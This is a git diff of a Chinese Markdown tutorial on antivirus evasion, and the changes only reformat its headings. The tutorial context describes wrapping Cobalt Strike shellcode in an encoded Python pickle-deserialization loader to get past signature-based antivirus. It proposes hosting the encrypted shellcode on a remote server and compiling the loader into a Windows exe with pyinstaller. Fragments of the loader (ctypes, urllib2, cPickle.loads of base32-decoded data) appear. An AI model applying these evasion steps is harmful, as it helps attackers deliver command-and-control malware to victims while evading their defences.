@@ -3,10 +3,12 @@ title: 基于加载器的python反序列化免杀(打包生成的exe暂只支持
 tags:
   - 免杀
 ---
-# 基于加载器的python反序列化免杀(打包生成的exe暂只支持win7可执行)
+### 基于加载器的python反序列化免杀(打包生成的exe暂只支持win7可执行)
 
 <strong>PS：来自moonsec师傅的分享</strong>
-## 0x01 环境配置
+
+#### 0x01 环境配置
+
 Win10 x64
 
 Win7  x64
@@ -21,11 +23,11 @@ CS4.0
 
 |---------------------------------------------------------------------------------------|
 
-## 0x02 免杀原理
+#### 0x02 免杀原理
 
 利用反序列化加载器绕过杀软基于特征的免杀。利用编码绕过shellcode的查杀。可以将加密好的shellcode放在远程服务器上，再加载不同的shellcode，进行扩展。
 
-## 0x03 制作加密shellcode
+#### 0x03 制作加密shellcode
 
 利用cs获取shellcode
 
@@ -61,7 +63,7 @@ CS4.0
 
 ![](media/c20169b6d62cf1444bbeb9d0da605c74.png)
 
-## 0x04 使用加载器加载payload
+#### 0x04 使用加载器加载payload
 
 使用如下加载器尝试加载执行：<br>
 import ctypes,cPickle,base64,urllib2<br>
@@ -155,7 +157,7 @@ cPickle.loads(base64.b32decode(e_run))'''.format(emb32_shellcode,emb32_vir,emb32
 
 如成功上线，使用pyinstaller生成exe可执行文件。
 
-## 0x05 pyinstaller生成exe文件
+#### 0x05 pyinstaller生成exe文件
 
 pyinstaller生成指定图标无命令行的exe文件
 
